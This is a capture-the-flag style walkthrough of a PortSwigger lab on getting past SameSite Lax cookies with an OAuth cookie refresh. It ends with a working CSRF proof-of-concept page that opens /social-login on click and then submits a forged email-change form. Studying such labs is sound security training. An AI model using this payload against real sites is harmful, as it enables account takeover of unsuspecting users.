
# SameSite Lax bypass via cookie refresh

This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.

The lab supports OAuth-based login. You can log in via your social media account with the following credentials: wiener:peter

Note: The default SameSite restrictions differ between browsers. As the victim uses Chrome, we recommend also using Chrome (or Burp's built-in Chromium browser) to test your exploit.

Hint: You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

Browsers block popups from being opened unless they are triggered by a manual user interaction, such as a click. The victim user will click on any page you send them to, so you can create popups using a global event handler as follows:

```
<script>
    window.onclick = () => {
        window.open('about:blank')
    }
</script>
```

---------------------------------------------

References: 

- https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions




![img](images/SameSite%20Lax%20bypass%20via%20cookie%20refresh/1.png)

---------------------------------------------

There is an update email function:



![img](images/SameSite%20Lax%20bypass%20via%20cookie%20refresh/2.png)


It is a POST request:



![img](images/SameSite%20Lax%20bypass%20via%20cookie%20refresh/3.png)


It is not possible to change the method to GET:



![img](images/SameSite%20Lax%20bypass%20via%20cookie%20refresh/4.png)


When logging in we get redirected to the subdomain "oauth":



![img](images/SameSite%20Lax%20bypass%20via%20cookie%20refresh/5.png)


This is generated with an url like:

```
https://oauth-0a6f009504061a2780d1702b026c00f7.oauth-server.net/auth?client_id=erw3xdeohdsu1g89oaqu0&redirect_uri=https://0a72005004831ac38087729700fb0018.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email
```

This request needs some parameters like client_id or it will fail:



![img](images/SameSite%20Lax%20bypass%20via%20cookie%20refresh/6.png)


From the Portswigger we know that “completing an OAuth-based login flow may result in a new session each time as the OAuth service doesn't necessarily know whether the user is still logged in to the target site”, so we must find a way to call this Oauth service, even when we dont know the client id value of the victim user.

Inspecting the requests, it is possible to generate a new session accessing "/social-login" when already logged:





![img](images/SameSite%20Lax%20bypass%20via%20cookie%20refresh/7.png)
![img](images/SameSite%20Lax%20bypass%20via%20cookie%20refresh/8.png)


Take the PoC generated by Burp for the POST request to update the email address and add the code so it executes when the victim clicks, so it open /social-login, wait 10 seconds and then submit the form:

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a72005004831ac38087729700fb0018.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test77&#64;test&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
	    window.onclick = () => {
	        window.open('https://0a72005004831ac38087729700fb0018.web-security-academy.net/social-login');
            setTimeout(submit, 10000);
			function submit(){			
				history.pushState('', '', '/');
		  		document.forms[0].submit();    	
      		}
	    }      
    </script>
  </body>
</html>
```